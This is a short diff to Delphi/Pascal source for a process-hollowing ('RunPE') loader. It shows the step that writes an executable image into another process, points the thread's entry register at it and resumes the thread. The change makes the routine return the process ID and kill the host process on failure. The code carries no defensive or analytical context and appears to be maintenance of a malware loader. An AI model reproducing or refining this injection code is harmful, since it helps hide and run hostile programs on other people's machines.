@@ -93,6 +93,7 @@ var
   dwImageBase:  DWORD;
   pModule:      Pointer;
   dwNull:       DWORD;
+  dwThID:       DWORD;
   NTHandle:     HINST;
   Unmap:        UnmapProc;
   WriteProcess: WriteProc;
@@ -110,7 +111,8 @@ begin
   End;
   //Load Done
 
-  Result := 0;
+  Result:=0;
+  dwThID:=0;
   IDH := Buffer;
   if IDH^.e_magic = IMAGE_DOS_SIGNATURE then
   begin
@@ -158,13 +160,16 @@ begin
               CT^.Eax := DWORD(pModule) + INH^.OptionalHeader.AddressOfEntryPoint;
               SetThreadContext(PI.hThread, CT^);
               ResumeThread(PI.hThread);
-              Result := PI.hThread;
+              dwThID:= PI.dwThreadId;
+              Result := PI.dwProcessId;
             end;
           end;
           VirtualFree(CTBase, 0, MEM_RELEASE);
         end;
-        if Result = 0 then
+        if dwThID = 0 then Begin
           TerminateProcess(PI.hProcess, 0);
+          Result:=0;
+        end;
       end;
     end;
   end;
